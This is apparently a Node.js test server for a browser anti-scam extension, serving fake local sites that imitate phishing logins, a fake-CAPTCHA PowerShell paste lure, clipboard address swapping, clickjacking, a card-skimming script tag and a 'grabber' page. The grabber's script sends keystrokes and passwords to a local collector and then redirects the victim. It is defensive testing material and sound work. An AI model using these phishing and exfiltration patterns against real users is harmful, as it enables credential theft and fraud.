// Decoy test lab. Fake sites on YOUR machine, nothing public.
//   node testbed/server.mjs        then open  http://localhost:8080
// Each fake site lives on its own *.localhost name (Chrome resolves those to this machine).
import http from "node:http";

const PORT = Number(process.env.PORT) || 8080;
const captured = []; // everything the pretend attacker's "collector" received

// ---- tiny file builders for the download lab (no dependencies) ----
const le = (n, b) => { const o = Buffer.alloc(b); o.writeUIntLE(n >>> 0, 0, b); return o; };
const zipOf = (names) => { let off = 0; const L = [], C = []; for (const nm of names) { const n = Buffer.from(nm); const lh = Buffer.concat([le(0x04034b50, 4), le(20, 2), le(0, 2), le(0, 2), le(0, 2), le(0, 2), le(0, 4), le(0, 4), le(0, 4), le(n.length, 2), le(0, 2), n]); C.push(Buffer.concat([le(0x02014b50, 4), le(20, 2), le(20, 2), le(0, 2), le(0, 2), le(0, 2), le(0, 2), le(0, 4), le(0, 4), le(0, 4), le(n.length, 2), le(0, 2), le(0, 2), le(0, 2), le(0, 2), le(0, 4), le(off, 4), n])); L.push(lh); off += lh.length; } const cd = Buffer.concat(C); return Buffer.concat([...L, cd, le(0x06054b50, 4), le(0, 2), le(0, 2), le(names.length, 2), le(names.length, 2), le(cd.length, 4), le(off, 4), le(0, 2)]); };
const fakeExe = () => { const b = Buffer.alloc(2048); b[0] = 0x4d; b[1] = 0x5a; b[0x3c] = 0x80; b.set([0x50, 0x45, 0, 0], 0x80); b[0x80 + 24] = 0x0b; b[0x80 + 25] = 0x02; return b; };
const LAB_FILES = {
  "invoice.pdf": () => fakeExe(),                                   // a program wearing a PDF's name
  "photos.zip": () => zipOf(["holiday.jpg", "invoice.pdf.exe"]),   // disguised program inside
  "bundle.zip": () => zipOf(["readme.txt", "setup.exe"]),          // program inside
  "guide.pdf": () => Buffer.from("%PDF-1.4\n1 0 obj<</Type/Catalog>>endobj\n%%EOF"),
  "notes.txt": () => Buffer.from("buy milk"),
};

const esc = (s) => String(s).replace(/[&<>"]/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;" }[c]));
const at = (name, path = "") => `http://${name}.localhost:${PORT}${path}`;
const HOME = `http://localhost:${PORT}/`;
const COLLECTOR = at("collector");

const page = (title, body, script = "") => `<!doctype html><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>${esc(title)}</title>
<style>
  body{font:16px/1.45 system-ui,sans-serif;max-width:430px;margin:36px auto;padding:0 16px;color:#222}
  input{display:block;width:100%;box-sizing:border-box;margin:8px 0;padding:10px;font:inherit}
  button{padding:10px 18px;font:inherit;cursor:pointer}
  .note{color:#666;font-size:14px}.lab{background:#fff4d6;border:1px solid #e6c36a;padding:7px 10px;border-radius:6px;font-size:13px;margin-bottom:20px}
  .warn{background:#ffe9e9;border:1px solid #e99;padding:8px 10px;border-radius:6px}
</style>
<div class="lab">Decoy test lab: a fake page on your own machine. <a href="${HOME}">All test pages</a></div>
${body}${script ? `<script>${script}</script>` : ""}`;

const FIELDS = `<input type="email" name="email" placeholder="Email"><input type="password" name="password" placeholder="Password"><input type="tel" name="phone" placeholder="Phone">`;

const SITES = {
  // ---- SCAN tests: should score badly on sight -------------------------------------------------
  "paypal-secure-login": () => page("PayPal - Log In", `
    <h2>Log in to PayPal</h2>
    <p class="warn">Your account has been limited. Verify your account immediately to restore access.</p>
    <form action="${COLLECTOR}/p.php" method="post"><input type="email" name="email" placeholder="Email"><input type="password" name="password" placeholder="Password"><button>Log In</button></form>`),

  "bump-shop": () => page("Account notice", `
    <h2>Account notice</h2>
    <p class="warn">Your account has been limited. Verify your account immediately to restore access.</p>
    <form action="${COLLECTOR}/p.php" method="post"><input type="email" name="email" placeholder="Email"><input type="password" name="password" placeholder="Password"><button>Continue</button></form>`),

  "arnazon-signin": () => page("Amazon Sign-In", `
    <h2>Sign in</h2>
    <form action="/signin" method="post"><input type="email" name="email" placeholder="Email"><input type="password" name="password" placeholder="Password"><button>Sign in</button></form>
    <p class="note"><a href="/privacy">Privacy</a> · <a href="/terms">Terms</a></p>`),

  "nike-outlet-sale": () => page("Nike Outlet Checkout", `
    <h2>Checkout</h2>
    <p><b>90% OFF everything!</b> Only 2 left in stock. Act now! Last chance!</p>
    <p>We accept payment in Bitcoin or gift cards for faster shipping.</p>
    <form action="/order" method="post"><input name="cardnumber" autocomplete="cc-number" placeholder="Card number"><input name="cvc" placeholder="CVC"><input type="email" name="email" placeholder="Email"><button>Pay now</button></form>`),


  // ---- GUARD tests (Phase D): the extension should block these on sight --------------------------
  "fake-captcha": () => page("Verify you are human", `
    <h2>Verify you are human</h2><p>Click the box, then follow the steps.</p>
    <button id="b" style="font-size:18px">&#9744; I'm not a robot</button>
    <ol class="note"><li>Press <b>Win + R</b></li><li>Press <b>Ctrl + V</b></li><li>Press Enter</li></ol>
    <p id="out" class="note"></p>`, `
    b.onclick = () => { navigator.clipboard.writeText('powershell -w hidden -c "echo decoy-lab-harmless"').then(() => out.textContent = 'copied'); };`),

  "docs-install": () => page("Install - Example Docs", `
    <h2>Install</h2><pre id="c">curl -fsSL https://get.example.com/install.sh | sh</pre>
    <button id="b">Copy</button> <p id="out" class="note"></p>`, `
    b.onclick = () => navigator.clipboard.writeText(c.textContent).then(() => out.textContent = 'copied');`),

  "clipboard-swap": () => page("Send crypto", `<h2>Send payment</h2><p id="out" class="note">Loading...</p>`, `
    setTimeout(() => navigator.clipboard.writeText('bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq').then(() => out.textContent = 'swapped', () => out.textContent = 'rejected'), 400);`),

  "permission-spam": () => page("Welcome!", `<h2>Welcome!</h2><p class="note">Allow everything to continue.</p><p id="out" class="note"></p>`, `
    setTimeout(() => { Notification.requestPermission().then((r) => out.textContent += ' notif:' + r);
      navigator.geolocation.getCurrentPosition(() => out.textContent += ' geo:ok', (e) => out.textContent += ' geo:' + e.code);
      navigator.mediaDevices.getUserMedia({ video: true }).then(() => out.textContent += ' cam:ok', (e) => out.textContent += ' cam:' + e.name); }, 300);`),

  "store-locator": () => page("Store locator", `
    <h2>Find a store</h2><button id="b">Use my location</button> <p id="out" class="note"></p>`, `
    b.onclick = () => navigator.geolocation.getCurrentPosition(() => out.textContent = 'geo:ok', (e) => out.textContent = 'geo:' + e.code);`),

  "virus-alert": () => page("WARNING", `<h2 style="color:#c00">Your computer is infected!</h2><p>Call 1-800-000-0000 now.</p><p id="out" class="note"></p>`, `
    let n = 0; const t = setInterval(() => { alert('Virus detected #' + (++n)); out.textContent = 'alerts shown: ' + n; if (n >= 6) clearInterval(t); }, 50);
    for (let i = 0; i < 40; i++) history.pushState({ i }, '', '#t' + i);`),

  heavy: () => page("Heavy page", `<h2>Heavy page</h2><form>${Array.from({ length: 1500 }, (_, i) => `<input name="f${i}" value="v${i}">`).join("")}</form>${Array.from({ length: 1500 }, (_, i) => `<a href="/p${i}">Link number ${i}</a>`).join(" ")}<p id="out"></p>`),

  "spa-app": () => page("Single-page app", `<h2>My app</h2><p id="out" class="note">routes: 0</p>
    <button id="b">Next page</button>`, `
    let i = 0; b.onclick = () => { history.pushState({ i }, '', '#p' + (++i)); out.textContent = 'routes: ' + i; };`),


  // ---- PROTECT tests (Phase D batch 2) -----------------------------------------------------------
  "link-trick": () => page("Sign in", `
    <h2>Sign in</h2><form action="/signin" method="post"><input type="email" name="email" placeholder="Email"><input type="password" name="password" placeholder="Password"><button>Sign in</button></form>
    <p class="note"><a href="/privacy">Privacy</a> · <a href="http://evil-pay.example/steal">www.paypal.com/help</a></p>`),

  clickjack: () => page("Win a prize", `
    <h2>Watch the video</h2><button style="font-size:20px;padding:20px">Play video</button>
    <iframe src="http://honest-shop.localhost:${PORT}/" style="position:fixed;inset:0;width:100%;height:100%;opacity:0;z-index:9999;border:0"></iframe>`),

  "fake-window": () => page("Sign in with Google", `
    <div style="position:fixed;left:30px;top:80px;width:360px;border:1px solid #888;border-radius:8px;background:#fff;box-shadow:0 8px 30px #0006">
      <div style="background:#eee;padding:6px 10px;border-radius:8px 8px 0 0"><span>https://accounts.google.com/signin/v2/identifier</span></div>
      <div style="padding:14px"><input type="email" placeholder="Email"><input type="password" placeholder="Password"><button>Next</button></div>
    </div>`),

  "checkout-skim": () => page("Checkout", `
    <h2>Checkout</h2><form action="/order" method="post"><input name="cardnumber" autocomplete="cc-number" placeholder="Card number"><input name="cvc" autocomplete="cc-csc" placeholder="CVC"><button>Pay</button></form>
    <p class="note"><a href="/privacy">Privacy</a> · <a href="/contact">Contact us</a> · Refund policy</p>
    <script src="https://cdn-evil.workers.dev/s.js"></script>`),

  "checkout-legit": () => page("Checkout", `
    <h2>Checkout</h2><form action="/order" method="post"><input name="cardnumber" autocomplete="cc-number" placeholder="Card number"><input name="cvc" autocomplete="cc-csc" placeholder="CVC"><button>Pay</button></form>
    <p class="note"><a href="/privacy">Privacy</a> · <a href="/contact">Contact us</a> · Refund policy</p>
    <script src="https://static.hotjar.com/c/hotjar-1.js"></script>`),

  "auto-download": () => page("Your download is starting", `<h2>Your download is starting...</h2><p class="note">If nothing happens, <a id="a" href="/files/setup.exe" download>click here</a>.</p>`, `
    setTimeout(() => document.getElementById('a').click(), 300);`),

  "download-lab": () => page("Download lab", `<h2>Download lab</h2><p class="note">Each link downloads a harmless test file. Decoy should check it when it finishes.</p>
    <ul><li><a id="d1" href="/files/invoice.pdf" download>invoice.pdf</a>: really a program. <b>Problem</b>.</li>
    <li><a id="d2" href="/files/photos.zip" download>photos.zip</a>: has "invoice.pdf.exe" inside. <b>Problem</b>.</li>
    <li><a id="d3" href="/files/bundle.zip" download>bundle.zip</a>: has setup.exe inside. <b>Be careful</b>.</li>
    <li><a id="d4" href="/files/guide.pdf" download>guide.pdf</a>: a plain PDF. <b>Nothing suspicious found</b>.</li>
    <li><a id="d5" href="/files/notes.txt" download>notes.txt</a>: plain text. <b>Quiet</b> (no pop-up).</li></ul>`),

  "pixel-shop": () => page("Pixel Shop", `<h2>Welcome</h2><p class="note">A normal page with tracking scripts.</p><p id="out" class="note"></p>
    <script src="https://static.hotjar.com/c/hotjar-2.js" onerror="out.textContent+=' hotjar:failed'" onload="out.textContent+=' hotjar:loaded'"></script>`),

  // ---- DUMMY tests: look innocent, then behave --------------------------------------------------
  grabber: () => page("Secure Sign In", `
    <h2>Sign in to your account</h2><p class="note">Your session expired. Please sign in again.</p>
    <form id="f">${FIELDS}<button>Sign in</button></form>`, `
    const C = ${JSON.stringify(COLLECTOR)};
    // 1) keystroke-style exfiltration: every value is sent the moment it changes
    document.addEventListener('input', (e) => fetch(C + '/bot123:AAA/sendMessage?text=' + encodeURIComponent(e.target.name + '=' + e.target.value)).catch(() => {}));
    // 2) on submit: send the password, then bounce to the "real" brand so the victim doesn't notice
    f.addEventListener('submit', (e) => { e.preventDefault();
      fetch(C + '/p.php', { method: 'POST', body: new URLSearchParams({ e: f.email.value, p: f.password.value }) })
        .catch(() => {}).finally(() => { location.href = ${JSON.stringify(at("paypal", "/signin"))}; }); });`),

  // stand-in for the "real" brand the grabber redirects to (so nothing leaves your machine)
  paypal: () => page("PayPal", `
    <h2>PayPal (stand-in for the real site)</h2><p>For your security, enter the one-time code we sent you.</p>
    <form><input name="otp" placeholder="One-time code"><button type="button">Continue</button></form>`),

  "honest-shop": () => page("Honest Shop - Sign up", `
    <h2>Sign up</h2><form id="f">${FIELDS}<button>Create account</button></form><p id="out" class="note"></p>
    <p class="note"><a href="/privacy">Privacy</a> · <a href="/contact">Contact us</a> · Refund policy</p>`, `
    f.addEventListener('submit', async (e) => { e.preventDefault();
      await fetch('/api/signup', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ email: f.email.value, password: f.password.value, phone: f.phone.value }) });
      out.textContent = 'Thanks, account created (pretend).'; });`),

  "tracker-shop": () => page("Tracker Shop - Join", `
    <h2>Join the list</h2><form id="f">${FIELDS}<button>Join</button></form><p id="out" class="note"></p>
    <p class="note"><a href="/privacy">Privacy</a></p>`, `
    // Normal-looking ad pixel: sends a SHA-256 of the email to Facebook's pixel URL (a fake id; harmless)
    f.email.addEventListener('change', async (e) => {
      const h = [...new Uint8Array(await crypto.subtle.digest('SHA-256', new TextEncoder().encode(e.target.value.trim().toLowerCase())))].map((b) => b.toString(16).padStart(2, '0')).join('');
      new Image().src = 'https://www.facebook.com/tr?id=0&ev=Lead&ud[em]=' + h; });
    f.addEventListener('submit', async (e) => { e.preventDefault(); await fetch('/api/join', { method: 'POST', body: JSON.stringify({ email: f.email.value }) }); out.textContent = 'Joined.'; });`),

  "quiet-shop": () => page("Quiet Shop - Register", `
    <h2>Register</h2><form action="/thanks" method="post">${FIELDS}<button>Register</button></form>
    <p class="note"><a href="/privacy">Privacy</a> · <a href="/contact">Contact us</a></p>`),
};

const INDEX = () => page("Decoy test lab", `
  <h2>Decoy test lab</h2>
  <p class="note">Load the extension (<code>dist/</code>), then try each page. Open the popup on it, and use <b>Test with dummy</b> where noted.
  Everything runs on this machine. The collector below shows what the fake attacker actually received.</p>
  <h3>Scan tests (just open the popup)</h3>
  <ul>
    <li><a href="${at("paypal-secure-login")}">paypal-secure-login</a>: fake PayPal login. Expect <b>Likely scam</b>.</li>
    <li><a href="${at("arnazon-signin")}">arnazon-signin</a>: look-alike Amazon login. Expect <b>Likely scam</b>.</li>
    <li><a href="${at("nike-outlet-sale")}">nike-outlet-sale</a>: fake sale shop. Expect <b>Sketchy</b> (card form + crypto/gift-card payment + 90% off + pressure + no contact).</li>
    <li><a href="${at("honest-shop")}">honest-shop</a> / <a href="${at("quiet-shop")}">quiet-shop</a>: normal sites. Expect <b>Looks fine</b>.</li>
  </ul>
  <h3>Guard tests (Decoy should block these by itself)</h3>
  <ul>
    <li><a href="${at("fake-captcha")}">fake-captcha</a>: click the box; page tries to copy a PowerShell command. Expect a <b>blocked copy</b> chip.</li>
    <li><a href="${at("docs-install")}">docs-install</a>: normal "Copy" button on a docs page. Expect <b>nothing blocked</b>.</li>
    <li><a href="${at("clipboard-swap")}">clipboard-swap</a>: copies a crypto address without a click. Expect blocked.</li>
    <li><a href="${at("permission-spam")}">permission-spam</a>: asks notifications, location and camera on load. Expect all three <b>held back</b>.</li>
    <li><a href="${at("store-locator")}">store-locator</a>: location only after you click. Expect <b>normal Chrome prompt</b>, no chip.</li>
    <li><a href="${at("virus-alert")}">virus-alert</a>: alert loop + back-button trap. Expect pop-ups stopped and a <b>Close this tab</b> chip.</li>
    <li><a href="${at("spa-app")}">spa-app</a>: normal single-page app. Expect nothing.</li>
  </ul>
  <h3>Protection tests (batch 2)</h3>
  <ul>
    <li><a href="${at("paypal-secure-login")}">paypal-secure-login</a>: full-page <b>"looks like paypal.com"</b> stop with "Go to paypal.com".</li>
    <li><a href="${at("link-trick")}">link-trick</a>: login page with a link that says paypal.com but goes elsewhere. Expect a red dashed link.</li>
    <li><a href="${at("clickjack")}">clickjack</a>: invisible frame over the page. Expect it outlined in red.</li>
    <li><a href="${at("fake-window")}">fake-window</a>: a drawn "browser window" with a password box. Expect a warning.</li>
    <li><a href="${at("checkout-skim")}">checkout-skim</a> / <a href="${at("checkout-legit")}">checkout-legit</a>: card form; only the first loads a script from a data-dump host.</li>
    <li><a href="${at("auto-download")}">auto-download</a>: starts a .exe download by itself. Expect it paused with Cancel / Keep.</li>
    <li><a href="${at("pixel-shop")}">pixel-shop</a>: loads a replay script. Turn on "Block known session-replay and ad pixels" in the popup and it won't load.</li>
  </ul>
  <h3>Download check</h3>
  <ul><li><a href="${at("download-lab")}">download-lab</a>: five test files. Turn on "Pause risky program downloads" in the popup first (it also switches on the post-download check).</li></ul>
  <h3>Dummy tests (open the popup, Test with dummy, then press the page's own button)</h3>
  <ul>
    <li><a href="${at("grabber")}">grabber</a>: looks fine on sight, but steals. Expect <b>Looks like a data grabber</b>.</li>
    <li><a href="${at("paypal-secure-login")}">paypal-secure-login</a>: posts your password to another site. Expect <b>data grabber</b>.</li>
    <li><a href="${at("tracker-shop")}">tracker-shop</a>: hashed email to an ad pixel. Expect <b>No leak seen</b> + an info line.</li>
    <li><a href="${at("honest-shop")}">honest-shop</a>, <a href="${at("quiet-shop")}">quiet-shop</a>: Expect <b>No leak seen</b>.</li>
  </ul>
  <p><a href="${COLLECTOR}/log"><b>Open the collector log</b></a> (what the pretend attacker received) · <a href="${COLLECTOR}/clear">clear it</a></p>`);

const LOG = () => page("Collector log", `
  <h2>Collector log</h2><p class="note">Everything the pretend attacker's server received. Refreshes every 2s.</p>
  ${captured.length ? captured.slice().reverse().map((c) => `<div class="note" style="border-top:1px solid #ddd;padding:6px 0"><b>${esc(c.method)}</b> ${esc(c.url)}<br>${c.body ? `body: <code>${esc(c.body)}</code><br>` : ""}<small>from ${esc(c.from)} at ${esc(c.t)}</small></div>`).join("") : "<p>Nothing received yet.</p>"}
  <p><a href="/clear">Clear</a></p>`, `setTimeout(() => location.reload(), 2000);`);

const server = http.createServer((req, res) => {
  const hostname = (req.headers.host || "").split(":")[0].toLowerCase();
  const name = hostname === "localhost" ? "" : hostname.endsWith(".localhost") ? hostname.slice(0, -".localhost".length) : null;
  let url;
  try { url = new URL(req.url.replace(/^\/{2,}/, "/"), `http://${hostname || "localhost"}`); }
  catch { res.writeHead(400); return res.end("bad url"); }
  const send = (code, type, body, extra = {}) => { res.writeHead(code, { "content-type": type, ...extra }); res.end(body); };
  const cors = { "access-control-allow-origin": "*", "access-control-allow-headers": "*", "access-control-allow-methods": "*" };

  if (req.method === "OPTIONS") return send(204, "text/plain", "", cors);

  let body = "";
  req.on("data", (d) => { if (body.length < 4000) body += d; });
  req.on("end", () => {
    if (name === "") return send(200, "text/html", INDEX());

    if (name === "collector") {
      if (url.pathname === "/log") return send(200, "text/html", LOG());
      if (url.pathname === "/clear") { captured.length = 0; return send(302, "text/plain", "", { location: "/log" }); }
      captured.push({ t: new Date().toLocaleTimeString(), method: req.method, url: url.pathname + url.search, body, from: (req.headers.origin || req.headers.referer || "?").replace(/^https?:\/\//, "").split("/")[0] });
      return send(200, "application/json", "{}", cors);
    }

    const labFile = url.pathname.startsWith("/files/") && LAB_FILES[decodeURIComponent(url.pathname.slice(7))];
    if (labFile) { const body = labFile(); res.writeHead(200, { "content-type": "application/octet-stream", "content-disposition": `attachment; filename="${decodeURIComponent(url.pathname.slice(7))}"`, "content-length": body.length, "access-control-allow-origin": "*" }); res.end(body); return; }
    if (url.pathname === "/files/setup.exe") { // slow download so the extension can pause it
      res.writeHead(200, { "content-type": "application/octet-stream", "content-disposition": 'attachment; filename="setup.exe"', "content-length": 600000 });
      res.write(Buffer.alloc(1000, 65)); setTimeout(() => { try { res.end(Buffer.alloc(599000, 66)); } catch {} }, 6000); return;
    }
    const site = SITES[name];
    if (!site) return send(404, "text/plain", `No test site "${name}". See ${HOME}`);
    if (req.method === "POST") {
      if (url.pathname.startsWith("/api/")) return send(200, "application/json", "{}", cors);
      return send(200, "text/html", page("Thanks", "<h2>Thanks!</h2><p>Form received by this site (pretend).</p>"));
    }
    if (/^\/(privacy|terms|contact)$/.test(url.pathname)) return send(200, "text/html", page(url.pathname.slice(1), `<h2>${esc(url.pathname.slice(1))}</h2><p class="note">Placeholder page.</p>`));
    return send(200, "text/html", site());
  });
});

process.on("uncaughtException", (e) => console.error("testbed error:", e.message));
server.listen(PORT, () => {
  console.log(`\nDecoy test lab running.\n\n  Open:  ${HOME}\n  Log:   ${COLLECTOR}/log\n\nCtrl+C to stop.\n`);
});
